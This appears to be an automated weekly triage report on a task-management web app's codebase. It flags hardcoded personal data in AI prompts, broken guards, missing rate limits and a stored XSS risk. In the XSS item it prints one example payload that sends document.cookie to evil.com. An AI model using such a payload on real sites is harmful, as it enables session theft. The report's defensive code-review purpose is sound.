# Weekly Triage — 2026-08-08

## 📊 Week at a glance
- **Commits this week**: 0 (last commit: `b38d4bb` on 2026-07-22, 17 days ago)
- **Files changed**: 0
- **Debt markers added**: N/A — no new code this week

> No commits landed in the last 7 days. This triage scans the entire codebase for pre-existing issues, focusing on items that could bite in production.

**High-churn files (all time, by commit count)**:
1. `index.html` — touched in essentially every commit; 14,924 lines; monolith risk
2. `landing.html` — heavy churn in July (PRs #79–83) around PLG/SEO work
3. `sw.js` — bumped for cache-busting without coordinated asset-path audit

---

> **Agent deep-scan also surfaced these pre-existing critical issues on top of the commit-based findings below.**

---

## 🚨 Needs immediate attention

### 0a. CRITICAL — Every AI feature gives advice aimed at "Panos / Givelink / SF move", not the actual user
- **`index.html:2519`** — `let profileName = localStorage.getItem('taskos_name') || 'Panos';`
- **`index.html:1070`** — `<h1 id="greeting">Good morning, Panos 👋</h1>` — visible HTML before JS renders
- **`index.html:5445`, `5647`, `5920`, `11415`, `11672`, `11810`** — AI prompts hardcode "Panos", "Givelink B2B SaaS for nonprofits", "SF move", "fundraising platform" as context
- Every signed-in user's AI triage, relationship nudges, morning briefing, and tweet drafts give advice aimed at the developer. The `getAboutMe()` helper exists but is bypassed by these strings.
- **Why**: Worst possible demo of the core product for anyone who isn't Panos.

---

### 0b. CRITICAL — AI morning briefing silently never runs for proxy-mode users
- **`index.html:11670`** — `if(!S.claudeKey&&!localStorage.getItem('taskos_api_key'))return;`
- `taskos_api_key` is never set anywhere in the codebase. The real key paths are `S.claudeKey` (direct) and `APP_CONFIG.aiProxy` (proxy). The morning briefing therefore silently exits for every proxy-mode user.
- **Fix**: change guard to `if(!S.claudeKey&&!APP_CONFIG.aiProxy)return;` — matching all other AI functions.

---

### 0c. MEDIUM — Personal health/finance targets hardcoded for all users
- **`index.html:6163`** — `const _NS_TARGETS={bodyfat:12,sleep:85,workout:5,weight:75,income:25000,passive:3600};`
- **`index.html:5223`, `5323`, `5324`** — progress bars labelled with `€25K income goal`, `12% BF goal`, `€300/month passive`
- Every user's Health and Finance dashboards show progress bars wired to the developer's personal goals. A user in the US earning in USD sees broken % progress toward €25K.
- **Fix**: Move `_NS_TARGETS` into `S` (persisted state) with user-editable settings.

---

### 0d. MEDIUM — "Givelink Outreach" hardcoded as a focus-day time block for all users
- **`index.html:4375`** — `{id:'fp-block-2', time:'11–12pm', icon:'🟣', label:'Givelink Outreach', task: top.find(t=>t.category==='givelink')||null, color:'#a78bfa'}`
- Every user's Focus Day Plan shows an "11–12pm: Givelink Outreach" block that can't be changed and refers to a task category no other user has.

---

### 1. Push notification icon is a 404 (introduced: `7c260f5` or earlier)
- **`sw.js:46-47`** — `icon: './icons/icon-192.png'` and `badge: './icons/icon-192.png'`
- **`index.html:11289`** — `icon:'./icons/icon-192.png'`
- The file `icons/icon-192.png` does not exist. Only `./icon-192.png` (root level) exists.
- **Why**: On some platforms (Android, Safari PWA) a 404 icon causes the entire push notification to be suppressed silently. Users who set up reminders get no alert.

---

### 2. "Next Week" bulk action creates orphaned tasks (introduced: likely `42c090d` bulk bar)
- **`index.html:14850`** — `<option value="next-week">Next Week</option>`
- The app has no `next-week` bucket view. `mvB(id, 'next-week')` stores the bucket value and saves, but no view renders it. Tasks are effectively gone.
- **Why**: Silent data loss. No toast, no indication. A confused user bulk-moving tasks here has no recovery path except editing each task.

---

### 3. XSS in core task rendering — every task view affected (pre-existing)
- **`index.html:3223`** (`inboxHTML`) — `${t.title}` in innerHTML
- **`index.html:3716`** (`tcHTML`) — `${t.title}` in innerHTML
- **`index.html:3594`, `3601`, `3603`** (weekly review wizard) — `t.title`, `g.title` in innerHTML
- **`index.html:2543`** (blocker dropdown) — `t.title` in innerHTML option text
- **`index.html:2527`** (checklist editor) — `c.text` in innerHTML
- The `esc()` helper exists at line 11776 but is not consistently applied to user-content fields.
- **Why**: Craft a task title like `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`. Any Supabase import, CSV import, or Readwise-imported highlight could trigger this. The Supabase sync path (shared data between devices) is the real risk vector.

---

### 4. AI features unreachable for new users — core value prop is dead on arrival
- **`index.html:9959`** — `aiProxy: ''`
- All three AI entry points (`aiAutoTriage`, `aiPlanDay`, task AI reply) check for `APP_CONFIG.aiProxy || S.claudeKey` and toast an error to new users. The landing page prominently features AI as the product's differentiator.
- **Why**: A visitor who signs up specifically for "AI that triages your inbox" hits a wall on first meaningful interaction. Likely responsible for drop-off between signup and activation.

---

### 5. No rate limiting on Claude proxy — live bill risk when aiProxy is enabled
- **`api/claude.js:1-49`** — no per-user rate limiting
- The file comment on line 13 acknowledges the gap. If `aiProxy` is set (fixing #4), any authenticated user can make unlimited Anthropic API calls.
- **Why**: A single user running a loop or a rogue browser extension could generate hundreds of dollars in API costs in minutes.

---

## 🧹 Cleanup opportunities

### 6. Analytics keys are empty — no data since the posthog PR landed
- **`index.html:9960`** — `posthogKey: ''`
- **`landing.html:702`** — `POSTHOG_KEY = ''`
- Both were added as empty placeholders in the PLG/analytics PRs (#76, #83) but never filled in.
- Every `track()` call in the app is a silent no-op. The scroll-depth and CTA-click events added to landing.html (#83) collect nothing.
- **Commit that added them**: `b38d4bb` (landing analytics), `32e7288` (app posthog)

---

### 7. Service worker still caches givelink.html (stale since `d635c06`)
- **`sw.js:4`** — `'./manifest-givelink.json'` in STATIC
- **`sw.js:17`** — `'./givelink.html'` in HTML
- Commit `d635c06` ("Remove Givelink from Task OS") separated the products but didn't update sw.js.
- Result: Arete's service worker downloads and caches a separate product's files on every install. Wastes cache budget.

---

### 8. OG/canonical URLs hardcoded to Vercel project slug
- **`index.html:24-32`** — `task-management-beige-eight.vercel.app`
- **`landing.html:16-21`** — same domain
- These were set correctly for the Vercel deployment but will be wrong on any custom domain.
- Low urgency unless a domain migration is planned, but pre-existing tech debt.

---

### 9. `_sbToken()` has a parallel-refresh race condition
- **`index.html:10022-10026`**
- If `callClaude()` and `sbSyncNow()` run concurrently (common during initial load), both may find the token expired and simultaneously call `_sbAuth('refresh_token', ...)`. The first call consumes the token; the second gets a 401, which `sbSyncNow()` catches and schedules a retry — creating a retry loop.
- Pre-existing; safe to defer but worth fixing before enabling the AI proxy.

---

## 🤔 Worth a second look

### 10. `toast()` accepts raw HTML — fragile escalation path
- **`index.html:2789`** — `el.innerHTML = msg`
- **`index.html:2596`** — `toast('... <span onclick="openAuthGate()">...')` (intentional HTML usage)
- This pattern works today because all HTML-rich toast calls use hardcoded strings. But it's one bad `toast(t.title)` call away from XSS. No comment or guard distinguishes "this is safe HTML" from "this is user data".
- Recommend: add `opts.html = true` flag to make the distinction explicit (see IMPROVEMENT_PLAN.md #15).

---

### 11. `sbSyncNow()` retries indefinitely after 401
- **`index.html:10439`** — `catch(e){ _sbPending = true; _sbSetStatus('⚠ '+e.message); }`
- On a 401 (expired refresh token), `_sbPending = true` triggers `_sbScheduleSync()` for a retry in 30s. The retry will also fail with 401. This creates a silent loop of Supabase auth requests that burns the free tier's request quota.
- Symptom to watch for: Supabase dashboard shows steady failed POST `/auth/v1/token` from a single user after a long idle session.

---

### 12. Notion integration retries CORS fetch on every modal open
- **`index.html:10927-10966`**
- After a CORS error (which is inevitable — Notion blocks browser-direct API calls), the state is not saved. Re-opening the Notion import modal triggers the failing fetch again.
- Low impact but creates a brief "Fetching from Notion..." flash and an unnecessary network request.

---

_Keep it under 30 items. This triage found 12 items worth tracking. The top 5 are production risks; items 6–9 are well-scoped cleanup tasks that can each be closed in under an hour._
